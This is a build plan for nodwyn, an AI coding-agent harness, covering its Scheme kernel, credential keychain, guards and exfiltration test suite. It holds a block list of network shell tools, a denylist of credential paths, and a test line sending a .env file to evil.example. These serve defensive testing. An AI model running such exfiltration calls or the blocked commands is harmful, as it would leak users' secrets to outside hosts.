# nodwyn — Build Plan (v0, self-hosting)

Companion to [SPEC.md](SPEC.md). The spec says *what* and *why*; this says *in what order, with what proof* — and, from week 5 on, **nodwyn is the tool used to build nodwyn**.

**Constraints, as planned on 2026-09-20 before any code existed:** one developer, 3–6 months, Go single static binary, user-written Scheme interpreter embedded in Go, TUI via bubbletea.

**Control-plane model:** at the start, a local Qwen served by Ollama on `workshop` over the tailnet — no API key, no cloud dependency, no secret on the build machine until Phase 3 (§3.4). Since P3 the control model is whatever `[control]` in `config.toml` names, an Ollama server or a keyed chat-completions server.

**Definition of done for v0:** the four I/O edges (E1–E4) are each guarded by the mechanism the spec assigns them, the exfil scenario suite passes, the log replays a session byte-for-byte, and a developer can use nodwyn on a real repo with real keys bound in `bindings.toml`. Proof of the last point: nodwyn built most of itself.

## Status (2026-09-30)

- **Done:** the bootstrap (B0–B3), P1b, P3–P7, P9 and P10: v0 without the optional L3, shipped 2026-09-21 to 2026-09-22. After v0: U1–U3 of the real UI, the task-oriented console, the standalone app, remote devices (D1–D5), workspaces, text attachments and remote MCP servers (D6–D8, the cowork track's W1, W2 text and W3a), and OAuth2 credentials (W4, 2026-09-30).
- **Not done:** P8 (L3, optional); unattended continuation between a run's turns (U4); contained local MCP servers (W3b/D9); documents out (W5); images as attachments.
- **Not planned, done anyway:** the loop as Scheme, model routing, the scratch directory, optional tool parameters, the working habits, the rename, Go 1.26 as the base (ADRs 26–29, 31–33). §5 "Outside the plan" says what drove them.
- **Next:** §10.

The week numbers below are the original estimate; §6 sets them beside what shipped and when. Promotion stopped creating tags on 2026-09-30 (ADR 13 amended): tags named in the phases below are the plan's, and the ones that exist are in §6.

---

## 1. Shape of the plan

Two stages:

- **Stage 0 — Bootstrap (weeks 1–4), built with an external coding-agent harness.** The smallest nodwyn that can do real work on this repo: read/write files, run `go build`/`go test`/`git`, talk to the model, log everything, and refuse the obviously dangerous. Deliberately tiny, deliberately hand-tested. Ends with the first promoted binary, `nodwyn-stable v0.1`.
- **Stage 1+ — Self-hosted (weeks 5–24).** Every remaining phase of the spec's build order is executed as nodwyn sessions driving `nodwyn-stable`. Each phase ends by promoting a new stable. The spec's ordering is preserved; only the entry point changed.

### Deviations from the spec's build order

| Change | Why |
|---|---|
| **Bootstrap compresses spec steps 1, 2 and the unlisted loop/LLM client into one bootstrap stage, built with an external harness, with a *minimal* kernel.** | To self-host you need a working loop before you need a complete interpreter. The kernel is grown to full scope afterwards, *by nodwyn*, as the first dogfood task (Phase 1b). |
| **The append-only log is built on day one, not at step 10.** | Invariant 1 makes the log the source of truth and every later phase says "logged". Phase 10 then only adds the derived views (window, summaries, index) — using real logs of nodwyn building nodwyn as its corpus. |
| **A naive log-derived context window ships in bootstrap.** | Self-building sessions are long; without *some* window policy the context overflows in week 5. The policy is dumb (drop oldest tool results first) but it is derived from the log on every turn, so invariant 1 holds from the start. Full memory remains Phase 10. |
| **The `Value` struct reserves its taint field in bootstrap.** | L2 (Phase 6) is cheap if planned for and expensive if not. Reserve the field now, leave it unset. |
| **A bootstrap safety envelope replaces the not-yet-built layers.** | Using nodwyn before keychain/L1/redaction exist means compensating controls (§3.3) must exist first, and each is retired only when the real layer lands. |

---

## 2. Repository layout

As it is on 2026-09-30 (the plan's first layout had `plan/`, `memory/`, `workspace/`, `attach/`, `detect/l2/` and `ui/` packages; each landed in an existing package instead, as noted):

```
nodwyn/
  cmd/nodwyn/               entrypoint only: flags → core → front-end
  cmd/nodwyn-schema/        regenerates the documented protocol schema
  internal/
    core/                   the UI-agnostic façade: Session; attachments, MCP connection, workspaces, resume (B2+)
    log/                    append-only JSONL, replay, event kinds             (B0)
    config/                 XDG dirs, config.toml, workspaces, mcp.toml        (B0+)
    policyfile/             locked, atomic writes of policy files              (U3)
    scheme/                 reader, values and provenance tags, eval/apply, prim table (B1, P1b, P6)
    scheme/prelude/         *.scm embedded in the binary                       (B1)
    prim/                   host primitives: fs, search, git, shell, http-request, jev, policy, versions (B2+)
    guard/                  the apply→Prim decision; checkers incl. E3, L1, L2  (B2+)
    budget/                 per-turn accounting, ceilings, checkpoints         (ADR 18)
    llm/                    Provider interface; Ollama and chat-completions    (B2, P3)
    loop/                   loop primitives and the default Scheme: strategy, plan gate, prompts, compaction, sub-agents, habits (B2, ADR 26)
    window/                 the log-derived window, summaries, exact replay    (B2, P10)
    keychain/               encrypted store, handles, sink injection           (P3)
    binding/                binding table, E3 lookup                           (P3)
    detect/l1/              shape/prefix scanner                               (P4)
    redact/                 the context-ingress redactor                       (P7)
    extract/                text from attached documents                       (W2)
    mcp/                    remote MCP client, manifest hashing                (W3a)
    frontend/plain/         line mode                                          (B2)
    frontend/tui/           bubbletea client                                   (P9)
    frontend/rpc/           the daemon: JSON-RPC over a unix socket            (U2)
    frontend/web/           the browser console, its bridge and assets         (U3, D1–D8)
    frontend/run/           supervised background runs                         (U4)
  dev/                      *.scm dev tools nodwyn loads to build itself       (B3)
  .nodwyn/                  init.scm (loads dev/) and allow.toml (ADR 17)      (B3)
  scripts/                  promote, selfcheck, smoke, lints, app and webview builds
  test/exfil/               the exfil scenario suite
  test/fakes/               fake Ollama, Jev and MCP servers
  test/sessions/            real session logs kept as replay fixtures
  test/browser/             browser flows against the console
  docs/adr/                 decision records
  docs/scheme.md            the language reference (doc-first)
  docs/friction.md          where nodwyn-stable got in the way
  docs/manual.md            how to read the code and how to use nodwyn
  docs/book/, docs/expert/  the book, and the field guide for users
```

Not built: `detect/l3/` and `tools/l3train/` (P8).

---

## 3. Decisions to lock in week 1 (write each as an ADR)

### 3.1 Architecture

1. **Value representation.** Tagged struct (`Kind`, payload, `Taint`), not an interface hierarchy — taint must be a field on every value, and handles must be a first-class `Kind` that prints as `#<cred:class:id>` and can never be coerced to a string.
2. **Log format.** One JSON object per line: `{seq, ts, session, kind, payload}`. Kinds fixed up front: `user.msg`, `llm.req`, `llm.resp`, `tool.call`, `tool.result`, `guard.decision`, `egress.check`, `gate.plan`, `cred.register` (class + id only), `redact.event`, `summary`. fsync per write. Sessions live under `$XDG_DATA_HOME/nodwyn/sessions/`.
3. **Model tool calls are Scheme applications.** The loop turns `{name, input}` into `(name arg …)` and evaluates it through `apply`. There is exactly one Scheme→Go exit — the guard call site in `apply` — and the model's calls, the prelude's calls and the user's `.scm` all cross it.
4. **Prim metadata.** Every primitive declares `Egress`, `Irreversible`, `ArgSpec` (which positions are destination / payload / credential slots), and a JSON schema for the LLM tool list. The guard reasons over `ArgSpec`, never over prim names.
5. **Keychain crypto.** File at `$XDG_CONFIG_HOME/nodwyn/keychain`, XChaCha20-Poly1305, key from passphrase via argon2id. OS keyring later — not v0.
6. **Unbound egress default = deny.** `confirm` is an opt-in policy flag; the confirm prompt always names class + destination + scope and offers to write a binding row. (Spec Risk 2.)
7. **Scheme scope — written from scratch, documented first.** No interpreter exists; B1 writes one. `docs/scheme.md` is written *before* the code and is the contract: syntax, data types, special forms, builtins, error model, the primitive-table contract, and an explicit "not in nodwyn Scheme" list. Bootstrap kernel: `define lambda if let let* begin set! quote quasiquote cond and or`, int64/float64, strings, lists, assoc, `error`, trampolined tail calls. Full v0 (Phase 1b) adds `letrec case do`, vectors, string ports, `guard`, `define-macro` only if the prelude needs it. **Never** in v0: hygienic macros, `call/cc`, `dynamic-wind`. The doc grows with the language; a builtin without a doc entry fails the conformance suite.
8. **LLM client = a `Provider` interface, Ollama first.** `llm.Provider` exposes `Chat(ctx, req) (stream)` with messages, tool schemas and a stop reason. The bootstrap implementation speaks Ollama's **native** `/api/chat` (not the `/v1` OpenAI shim): it streams, returns `thinking` as a separate field, returns tool-call arguments as JSON objects (which map 1:1 onto ADR 3's Scheme application), and accepts `options.num_ctx` and `keep_alive`. The control plane is configured, not keyed: `config.toml` `[control] provider="ollama" url="http://workshop.example:11434" model="qwen3.8-27b-96k:latest"`. Authorization is the tailnet ACL. An OpenAI-compatible provider (for `llm-call` data-plane use) and an Anthropic Messages provider come later behind the same interface; keychain class `nodwyn-control` exists for a *keyed* control plane and is unused while workshop is the control plane.
9. **Context and cache discipline.** The backend context is 98,304 tokens; the window budget is **80 Ki input + 8 Ki reserved for generation**, leaving margin. The request prefix — system prompt, then tool schemas, then messages in append-only order — must be byte-stable between turns so Ollama's KV prefix cache hits (a cold 80 Ki prompt eval on the RTX 4090 costs tens of seconds; a warm one costs nothing). Window elision therefore replaces payloads *in place* (`[elided seq=N]`) and never reorders or rewrites earlier turns. Model `thinking` is logged (`llm.resp.thinking`) but never fed back into the window.
10. **Core/front-end boundary.** The core (`internal/core` and everything it imports: loop, scheme, guard, llm, window, log…) knows nothing about terminals. It exposes one façade, `core.Session`: `Send(userText)`, `Events() <-chan Event`, `Answer(promptID, reply)` for confirms and masked input, `Abort()`, `Close()`. Every user-visible thing — streamed text, thinking, tool calls, guard decisions, plan scores, confirm prompts — is an `Event`, and the event stream is the same stream the log writes, so any front-end is a log subscriber with a reply channel. Front-ends live under `internal/frontend/` (`plain` in bootstrap, `tui` in P9, `rpc` for a future GUI). Dependency direction is enforced by a CI lint: nothing outside `internal/frontend/` and `cmd/` may import `internal/frontend/...` or any `charmbracelet` package, and the core never reads the terminal directly — I/O with the user goes through `Answer`/`Events` only. A future real UI is a new package under `frontend/`, not a change to the core.
11. **Terminal stack.** bubbletea + bubbles + lipgloss, confined to `internal/frontend/tui`. (The spec's "crossterm" is a Rust crate; bubbletea owns the terminal in Go, so nothing is missing.)

### 3.2 Self-hosting discipline (compiler-style staging)

12. **Two binaries, always.** `bin/nodwyn` is the working-tree build. `~/.local/bin/nodwyn-stable` is the last promoted build. **All development sessions run `nodwyn-stable`; nodwyn never edits itself through the binary being edited.** A broken working tree can never strand you.
13. **Promotion.** `scripts/promote.sh` runs `make accept` (unit + exfil suite + structural lints) and `scripts/selfcheck.sh` (the candidate must complete a scripted session: read a file, register a dev tool, run `go test ./internal/log`, replay its own log). Only then: `nodwyn-stable` → `nodwyn-stable.prev`, candidate → `nodwyn-stable`. The stable binary's version is the commit it was built from; until 2026-09-30 promotion also created a git tag `v0.N-<phase>` (ADR 13, amended). `nodwyn-stable` is the webview build wherever WebKit is available, so `nodwyn-stable app` opens a window (ADR 30). Rollback is `mv`.
14. **`.nodwyn/init.scm` convention.** On start, nodwyn loads `./.nodwyn/init.scm` if present (after `prelude/`). This repo's `init.scm` loads `dev/*.scm`. Nothing in `dev/` bypasses the guard — that is the whole point.
15. **Friction log.** When nodwyn-stable gets in the way, hand-edit *and* write one line in `docs/friction.md`. That file is the backlog for the line-mode UI, the TUI (P9) and memory (P10) — real data, not guesses.
16. **Fallback is allowed and honest.** If a task is faster by hand or with another agent, do it that way and note it. The goal is a built nodwyn, not purity. The measure of success is the trend in friction.md, not 100% self-authorship.

### 3.3 Bootstrap safety envelope

Until the real layers exist, these compensating controls make bootstrap-era nodwyn safe to run *in this repo*. Each row names the phase whose promotion retires it (or keeps it as defense in depth).

| Bootstrap control | Replaces | Retired by |
|---|---|---|
| **No credential of any kind on the build machine.** The control plane (workshop) needs none; the only reachable endpoint is inside the tailnet | keychain, binding table | **P3** — the keychain exists; **P5** registers the first real credential (Jev) |
| Child processes get an allowlisted env only (`PATH HOME GOPATH GOCACHE GOFLAGS GOMODCACHE TERM LANG`) | E2 redaction of `env` output | never — defense in depth |
| No `http-request` prim registered; `llm-call` absent | binding table / E3 | **P3** — enabled with E3 in place |
| `fs-*` and `shell-exec` pinned to the repo root; absolute or `..` paths outside it ⇒ Deny | — | pin stays permanently (per-project cwd is the model) |
| Path denylist in `fs-read`: `.env*`, `*.pem`, `*.key`, `id_*`, `*.kdbx`, `~/.ssh ~/.aws ~/.config/nodwyn` | L1 / E2 redaction | never — defense in depth |
| Shell argv hard-trigger: `curl wget nc ssh scp rsync git push git reset --hard rm -rf` ⇒ Confirm | L1 on argv, P5 hard triggers | **P5** — folded into the hard-trigger list |
| Irreversible prims (`fs-write`, `shell-exec`) ⇒ Confirm; `fs-write` shows a diff first | — | permanent (Confirm only, no diff prompt once plan gate exists) |
| Operator rule: no secrets in this repo; never paste a secret into nodwyn | E4 redaction | **P7** |
| Operator rule: run bootstrap-era nodwyn only in this repo | everything | **P7** (first version safe on other repos with real keys) |

Known hole, accepted: `shell-exec` can still `cat` a file outside the repo. The argv trigger catches the obvious spellings; the rest is the operator rules until P7.

### 3.4 Control-plane reference: workshop's Ollama (verified 2026-09-20)

*A record of the bootstrap's control plane. The control model is now configured per machine (`[control]` in `config.toml`); nothing in nodwyn depends on workshop.*

Source of truth: `infra/homelab/hosts/workshop/stacks/ollama/` (compose + Modelfile). Live facts checked against the running server:

| | |
|---|---|
| Endpoint | `http://workshop.example:11434` (100.64.0.70, tailnet-only; Docker binds the Tailscale IPv4 only) |
| APIs | native `/api/chat`, `/api/embed`, `/api/tags`, `/api/ps`; OpenAI shim at `/v1` |
| Runtime | Ollama 0.34.2 (compose pins 0.34.0 by digest — drift to note in infra) |
| Model | `qwen3.8-27b-96k:latest` = `qwen3.8:27b` (27.3B, Q4_K_M, 17.7 GB) with `num_ctx 98304`; also `qwen3.6-27b-150k:latest` |
| Serving limits | `OLLAMA_MAX_LOADED_MODELS=1`, `OLLAMA_NUM_PARALLEL=1`, `KEEP_ALIVE=30m`, KV cache q8_0 + flash attention |
| Tool calling | Works on both APIs. Native returns `message.tool_calls[].function.arguments` as an object and `message.thinking` separately; `/v1` returns `reasoning` + stringified arguments |
| Measured | ~30 tok/s generation; prompt cache hits reported (`cached_tokens`) |
| Also cached | `qwen3-embedding:0.6b` (1,024-d via `/api/embed`) and a Qwen3 reranker — relevant to the spec's *deferred* embedding index, not v0 |

Consequences for the plan:

- **One slot.** workshop serves one request at a time, shared with OpenCode/Pi/Jan. The loop must tolerate queueing (long per-request timeouts, streaming keeps the UI alive, user abort cancels the HTTP request so the slot frees). Two nodwyn sessions at once will serialize; that is fine for one developer.
- **Prefix stability is a performance feature** (ADR 9). Tool schemas go into the prefix once and must not change order between turns; `dev/*.scm` loads before the first message, never mid-session.
- **Thinking is data, not context.** Log it, show it dimmed in the UI, never send it back.
- **Model capability is the dogfood ceiling.** A 27B Q4 model is a competent coding assistant but not a frontier agent: tasks handed to nodwyn-stable must be small and well-specified, tool descriptions must be explicit, and the Seam A plan gate (P5) does more work here than it would with a frontier model. See Risk 1.
- **Swapping the control plane is a config change**, not a refactor: once P3 exists, a keyed provider (Anthropic Messages, or any OpenAI-compatible endpoint) can be the control plane via `nodwyn-control` if the hardest phases need it. That is a decision to make on evidence from friction.md, not up front.

---

## 4. Stage 0 — Bootstrap (weeks 1–4, built with an external harness)

### B0 — Skeleton + log (week 1)

- `go mod init github.com/fclaude/nodwyn`, Go 1.27, Makefile (`build test lint accept exfil promote`), GitHub Actions: `go test -race`, `go vet`, `staticcheck`, `govulncheck`.
- `internal/log`: writer, reader, replay iterator; session ids; monotonic `seq`.
- `internal/config`: XDG paths, policy struct, empty `bindings.toml`.
- ADRs 1–16.
- `scripts/lint-boundaries.sh`: the ADR 10 dependency lint, wired into `make lint` from day one (trivially green until B2).
- **Accept:** `nodwyn --version`; log write → replay round-trips 10k events; `make exfil` runs (empty suite).

### B1 — Minimal Scheme kernel (weeks 1–2)

- **`docs/scheme.md` first** (half a day): the subset's reference, per ADR 7. Every later item implements a section of it.
- Reader, printer, values with reserved `Taint`, environments, `eval` and `apply` as two fixed Go functions, trampolined tail calls, Scheme errors ⇄ Go errors.
- Primitive table `map[string]*Prim` with handler + metadata. Pure builtins: arithmetic, strings, lists, assoc, `json-parse`/`json-emit`.
- `register-tool`: name + lambda + metadata → inserts a `Prim` whose handler re-enters `apply`.
- `internal/scheme/prelude/*.scm` via `go:embed`; `load`.
- **Accept:** ~40-snippet suite (grows to ~100 in P1b), one snippet per documented form/builtin so the doc and the suite stay in step; `(loop 1000000)` without stack growth; **kernel-fixed test** — hash of the eval/apply paths and special-form table unchanged after loading arbitrary `.scm`; only the prim table grew.

### B2 — Guard, prims, loop, line UI (weeks 2–3)

- `internal/guard`: `Check(ctx, *Prim, args) Decision` at the one dispatch site. `Decision ∈ {Allow, Deny{Reason, Class}, Confirm{Prompt}}`. Deny becomes an ordinary tool result fed to the model; Confirm blocks on a `Confirmer`, which `core` implements by emitting a `confirm` event and waiting on `Answer` — the guard never knows which front-end is attached. Every decision logged.
- Checkers shipped: `MetaPolicy` (Irreversible ⇒ Confirm), `RepoPin`, `PathDenylist`, `ArgvTrigger` — the envelope rows from §3.3.
- Prims: `fs-read`, `fs-write` (with diff preview), `fs-list`, `shell-exec` (scrubbed env, cwd = repo, ctx-cancellable). **No** `http-request` yet.
- `internal/llm`: `Provider` interface + Ollama native `/api/chat` implementation — streaming, tools, `thinking` split out, `num_ctx`/`keep_alive` from config, ctx-cancellable. Tool list generated from the prim table in stable order. Smoke test against workshop is a manual `make smoke`; CI uses the fake.
- `internal/loop`: the spec's loop; stop on `end_turn`, max iterations, user abort, guard fatal.
- `internal/window`: naive policy — full transcript until the 80 Ki budget, then elide oldest `tool.result` payloads *in place* as `[elided seq=N]`, then oldest turns. Rebuilt from the log every turn; prefix byte-stable across turns (ADR 9).
- `internal/core`: the `Session` façade from ADR 10 — the loop runs in a goroutine, emits `Event`s, blocks on `Answer` for confirms.
- `internal/frontend/plain`: line mode over `core.Session` — prompt, streamed text, one-line tool cards, y/n confirms, `:replay`, `:log`. `cmd/nodwyn` only wires config → core → front-end.
- **Accept:** "read `internal/log/log.go` and explain it" end-to-end against workshop; `kill -9` mid-session then `nodwyn replay` reproduces the transcript; a session that exceeds the window budget keeps working, the elisions are visible in `:log`, and the turn after an elision still reports a sub-second `prompt_eval_ms` for the unchanged prefix (the native API does not report cached tokens; prompt-eval time is the cache signal).
- **Done 2026-09-21.** The exfil runner shipped here too, with eight bootstrap scenarios (denylist, repo pin, symlink escape, argv trigger, write confirm). The plain front-end shows the fs-write diff in the confirm prompt.

### B3 — Dev tools in Scheme + first promotion (week 4)

- **Standing command approvals (ADR 17):** the dev tools wrap `shell-exec`, which is irreversible, so without this every `go test` would prompt. `.nodwyn/allow.toml` (per repo), `policy.allow_commands` (global) and `a` answers (session only) give the guard a standing Allow that outranks Confirm, never Deny; every use is logged.
- `dev/go.scm`: `go-build`, `go-test` (pkg pattern), `go-vet`, `go-fmt-check`, `run-make` — composed from `shell-exec` via `register-tool`; the guard sees both the wrapper and the inner call.
- `dev/git.scm`: `git-status`, `git-diff`, `git-log`; **no** `git-commit`/`git-push` tools in v0 — the operator commits.
- `dev/repo.scm`: `grep-repo`, `find-files`, `read-adr` (pure Scheme over `fs-list`/`fs-read`).
- `.nodwyn/init.scm` loads the above; `load` resolves relative paths against the repository root.
- `fs-edit` (exact, unique old→new with a diff preview) — added from the first self-hosting run's friction, see below.
- `scripts/selfcheck.sh`, `scripts/promote.sh`, `docs/friction.md`, `docs/manual.md`.
- **Accept — the self-hosting test:** with `bin/nodwyn` as candidate, a session adds a `string-reverse` builtin to `internal/scheme` with a doc row and a conformance snippet, runs `go-test`, and gets green — every tool call visible in the log, `go-test` routed through `register-tool → apply → guard → shell-exec`. Promote.
- **Done 2026-09-21.** First run (no `fs-edit`): 28 tool calls, 15 confirms, one mangled line repaired with sed/python — correct in the end. Second run (with `fs-edit`): 10 tool calls, 4 confirms, clean 9-line diff. Promoted as `v0.1-bootstrap`.

**Milestone M0 (end of week 4): `nodwyn-stable v0.1-bootstrap`. From here on nodwyn builds nodwyn.**

---

## 5. Stage 1+ — Phases built with nodwyn (weeks 5–24)

Each phase: (a) open a session in `nodwyn-stable`, (b) point it at the ADR and the phase section below, (c) work in small tool-visible steps, (d) `make accept`, (e) promote. Each phase has a **With nodwyn** note: what nodwyn-stable can and cannot do at that point, and what the promotion unlocks.

### Phase 1b — Grow the kernel to full v0 scope (weeks 5–6)

- Add `letrec case do`, vectors, string ports, `guard`/conditions, `define-macro` if needed; grow the conformance suite to ~100.
- Tighten the printer, error messages with source positions, `load` relative paths.
- **With nodwyn:** the ideal first dogfood task — pure Go, crisp tests, needs only `fs-*` and `go-test`. Also the first two weeks of friction.md. Expect this to be slower than hand-coding; that is the point.
- **Accept:** suite green; kernel-fixed test still green; promote `v0.2-kernel`.

**Done 2026-09-21 (fallback, ADR 16 — hand-coded by an external agent, not a nodwyn-stable session; reviewed and fixed before commit):** `letrec` (shared frame, mutual closure bindings), `case` (`equal?` on datums), `do` (R5RS steps, Go loop = constant stack), `when`/`unless`, `guard` (R7RS shape `(guard (var clause …) body …)`, `var` bound to `((message . …) (irritants …))`; denials and cancellation are never catchable), `with-output-to-string` (minimal string port), vectors (`#(…)` reader, `vector*` builtins, `equal?`/`eq?` by identity) and block comments `#| … |#`. `define-macro` omitted — the prelude does not need it (ADR 7). Conformance suite roughly doubled (target was ~100); `docs/scheme.md` updated (reader, §2, §3, §4, §5, §9). Kernel version bumped `b1` → `b2`. **Not done (deferred to a follow-up):** source positions in *runtime* errors, characters, full string-port objects — all still listed in §9.
- **Review fixes (2026-09-21):** `(when)`/`(unless)` no longer panic; `guard` re-shaped to R7RS and made unable to catch `*Denied` or context errors; `case` compares symbols exactly; vectors are a shared `*Vector` (identity, mutation) and `vector` is a declared parameter type; an unterminated `#|` is incomplete input; `with-output-to-string` is reserved like every other form.
- **Promoted** as `v0.3-kernel`.

### Phase 3 — Credentials: keychain, handles, binding table (weeks 7–9)

- `internal/keychain`: encrypted store; entries `{id, class, created}`; the value never leaves the package except through sink functions (`InjectHeader/InjectQuery/InjectBody`) into an outgoing request at a named position. The value is never a `scheme.Value`.
- `(credential-register "class")`: masked terminal input → keychain → `Handle`. Log gets `{class, id}` only.
- `internal/binding`: `bindings.toml` rows `[[bind]] class="…" dest="…" positions=["header:Authorization"] methods=["POST"]`; hot-reload; nodwyn may append a row on user confirmation.
- E3 checker: for every handle in a credential slot of an egress prim, look up `(class, host, position, method)`. Bound → Allow + `egress.check`. Unbound → Deny (default) / Confirm (policy). Never fail open.
- `http-request` prim (now registered) resolves handles at request-build time, at the bound position only. `llm-call` prim for other providers — data-plane, through E3.
- Second `llm.Provider`: OpenAI-compatible chat (also usable against workshop's `/v1`) exposed as the data-plane `llm-call` prim, credential slot in `ArgSpec`, through E3 like any egress. An Anthropic Messages provider is optional here and can wait for a real need.
- Keychain class `nodwyn-control` defined for a keyed control plane; unused while workshop is the control plane.
- **With nodwyn:** nodwyn-stable v0.2 writes this code. Tests use canary values, never real keys; nodwyn never touches the real keychain during development because the working tree's binary is not the one running. There is no real key to register at promotion — the first one arrives with Jev in P5 — so this phase is proven entirely by the exfil suite and fakes.
- **Accept — first exfil scenarios** (each asserts the decision *and* that a canary secret appears nowhere in log, context dump or stdout): bound header ⇒ Allow; other host ⇒ Deny; body instead of header ⇒ Deny; keychain unreadable without passphrase; `(display handle)` prints `#<cred:…>`. Promote `v0.3-creds`.
- **Done 2026-09-21; promoted as `v0.4-creds`.** No `llm-call` primitive was built and the `nodwyn-control` class is unused: other models are configured and asked by name through `model-turn` (ADR 27), and a keyed control model names its credential in `[control]`; either way the key is bound like any other and checked on every request.

### Phase 4 — L1 fast path (weeks 10–11)

- `internal/detect/l1`: class catalog as a Go table (prefix/shape regexes for Anthropic, OpenAI, GitHub, AWS, Slack, PEM, JWT; windowed entropy; base64/hex structure). "Unknown-shape high-entropy" is its own class so L3 can take the residual later.
- Egress allowlist in config.
- Guard checker on E3 text args (`http-request` headers/body, `shell-exec` argv, `fs-write` outside project). Hit ∧ no binding ⇒ Deny. Scanner error/timeout ⇒ Deny.
- **With nodwyn:** nodwyn runs the false-positive sweep on its own repo and on two others via `grep-repo`/`fs-read` — a real workload for tuning. Promotion lets the operator loosen the "never paste" rule slightly for known shapes; the rule formally stays until P7.
- **Accept:** p99 < 1 ms on 64 KB; precision/recall on the curated set; FP sweep clean on SHAs/UUIDs/base64 images; exfil scenario: literal key in body to unbound host ⇒ Deny naming the class. Promote `v0.4-l1`.
- **Done 2026-09-21 (external agent, reviewed and fixed before commit).** `internal/detect/l1`: tokenizer + shape catalog + PEM + entropy residual, 62 µs per 64 KB, fuzzed. `guard.TextSecret` reads roles (`payload`, `argv`, `dest`): a literal known-class key in an egress payload follows the binding table; on a command line it is denied; in an in-repo write it is a *security confirm* that standing approvals cannot waive. Review fixes: the unknown-entropy residual no longer decides (it denied `git checkout feature/some-branch_name`); in-repo writes are confirm, not deny (they are not egress); `sk-proj-`/`sk-svcacct-` keys recognised; host parsed via `binding.FactsOf`; config `l1.allow_classes` validated and `l1.allow_values` documented as placeholders only. Tag will be `v0.5-l1` (numbering drifted, see git tags).

**Milestone M2 (end of week 11): safe to run with real keys against bound hosts.**

### Phase 5 — Plan gate, hard trigger, Seam A (weeks 12–13)

- **Jev as Scheme egress primitives (ADR 20).** Three host primitives registered in `internal/prim/` (Go handlers, `Meta.Egress: true`): `jev-noul`, `jev-score`, `jev-choice`. Each takes a credential handle in its first argument (`Param.Role: "credential"`). The loop's Seam A call is `(jev-score handle plan-text ask-text)` evaluated through `interp.Apply` — the same path a model tool call takes: guard intercept → binding check → redaction → HTTP → Scheme value returned. There is no separate Go client package; no second surface.
  - Endpoint: `POST https://api.typesafe.ai/v1/systemone`, model `jev-1.13.0`. The Jev key is a bound data-plane credential (P3) — **the first real secret on the build machine**, and the first real use of P3.
  - The guard sees Jev calls like any other egress: `guard.decision` logged, binding check fires, payload redacted (L1 now, L1+L3 at P7), `jev.req` logged with level, bytes, payload hash, redaction events, and the score.
  - **User tools can call Jev under the same policy.** A user-registered tool that wraps `jev-score` is indistinguishable from a model tool call at the guard level; the `origin` field in the log distinguishes them, but the policy is identical. The model can only call such a tool if the user has registered it.
  - **The loop's `provider.Chat()` is the sole Go-only call** — the control plane. Per the spec's LLM-as-tool split it is the harness's identity, not a guarded egress, not subject to the binding check, and logged as `llm.req`/`llm.resp`, not `guard.decision`.
- **Jev is an egress edge (ADR 19).** The Jev credential is bound to `api.typesafe.ai` (P3); the payload — the user's ask and the plan text, by default — passes the same redaction controller the model context gets (L1 now, L3 later, `[REDACTED class]`) before it is sent. No bespoke sanitiser: E3 + E2 composed. `jev.content` (`none` / `plan` / `plan+summaries` / `full`, the last opt-in per repo) sets how much beyond ask+plan may go; every call is logged as `jev.req` with level, bytes, payload hash and redaction events.
- **`register-check` (ADR 20).** A hidden builtin: `(register-check name verdict predicate)` adds a Scheme-written guard checker. `verdict` is `"deny"` or `"confirm"` (not `"allow"`). The strictest-wins rule guarantees a user checker can only **tighten**, never relax. The checker is added after all Go checkers. Hidden from the model; callable only from user-originated Scheme.
- Noul gate before each message → plan → Seam A `score` → revise ≤3 → proceed. `gate.plan` logged per message.
- Hard trigger (code): the B2 `ArgvTrigger` list folded in and extended — `fs-write` outside cwd, any unbound egress, executing content that arrived via `http-request`.
- Degradation: Jev unreachable ⇒ hard trigger still enforced, gate defaults to "plan", outage logged.
- **With nodwyn:** built without a plan gate; after promotion every later build session is planned and scored — the remaining phases (L2, redaction, TUI) are the hardest, so the quality lift lands where it matters.
- **Accept:** fake Jev in `test/fakes`; exfil scenarios: a Jev call with an unbound credential ⇒ Deny; a Jev call with a bound credential whose payload contains a canary ⇒ the canary is redacted in the sent payload and in `jev.req`; `jev.content = none` sends nothing; gate events for every message in a replayed session; `register-check` with a predicate matching `shell-exec` ⇒ the guard records a confirm/deny from the Scheme checker; the checker cannot override an existing Deny. Promote `v0.5-plan`.
- **Done 2026-09-22 (external agent, reviewed and fixed before push).** `jev-noul`/`jev-score`/`jev-choice` as egress primitives (ADR 20) over the documented System One protocol (`state`/`model`/`questions` → `answers`, `Authorization: Bearer`), redaction before send, `jev.req` per call; the gate (`internal/plan`) thresholds the noul probability, scores plans on a 5-level rubric normalised to 0..1, revises ≤3; the plan enters the window's task block; `register-check` for tightening-only Scheme checkers. Review fixes: the client had invented a wire format (`verdict`/`score` fields) and the fake matched it; the plan was computed and discarded; Bearer auth was impossible (positions now take a scheme: `header:Authorization:Bearer`); checkers registered in `init.scm` were dropped by a guard swap; `jev.content` defaulted to `full` against ADR 19. Not yet verified against the live API (no key registered). Tag `v0.6-plan`.

### Phase 6 — L2 taint (weeks 14–15)

- `Taint` populated at E1: `http-request`, `fs-read`, `env-get`, `shell-exec` results get `external:<source>`; handles carry `cred:<class>`.
- Propagation implemented once in the prim-call path (`out.Taint = ∪ args.Taint` for pure prims; explicit opt-out per prim).
- E3: `cred:<class>` taint ⇒ binding lookup; `external` to unbound ⇒ policy. When L2 knows, L3 is not invoked.
- `(box v)`/`(wipe v)` strip taint, logged, only from user-originated evaluation — `ctx.Origin ∈ {user, model}` added here.
- **With nodwyn:** this phase edits `internal/scheme` dispatch — the heart of the interpreter nodwyn-stable runs on. Safe only because of ADR 12 (two binaries). Good moment to verify rollback (`nodwyn-stable.prev`) actually works.
- **Accept:** property test `taint(result) ⊇ ∪ taint(tainted leaves)` over random pure-prim trees; `(http-request "https://evil.example" (string-append "k=" (fs-read ".env")))` ⇒ Deny; model-originated `wipe` ⇒ Deny, user-originated ⇒ Allow (spec Risk 1). Promote `v0.6-taint`.
